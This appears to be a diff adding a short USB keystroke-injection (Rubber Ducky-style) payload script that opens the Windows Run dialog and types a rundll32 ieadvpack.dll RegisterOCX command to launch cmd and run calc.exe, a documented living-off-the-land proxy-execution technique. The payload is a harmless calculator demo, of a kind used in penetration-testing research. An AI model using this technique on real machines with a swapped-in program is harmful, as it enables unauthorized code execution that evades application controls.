@@ -1,0 +1,9 @@
+REM by JOB
+REM Launch command line by calling the RegisterOCX function. more info here https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/
+GUI r 
+DEFAULT_DELAY 350
+STRING rundll32 ieadvpack.dll, RegisterOCX cmd /c c:\windows\system32\calc.exe
+ENTER
+
+
+
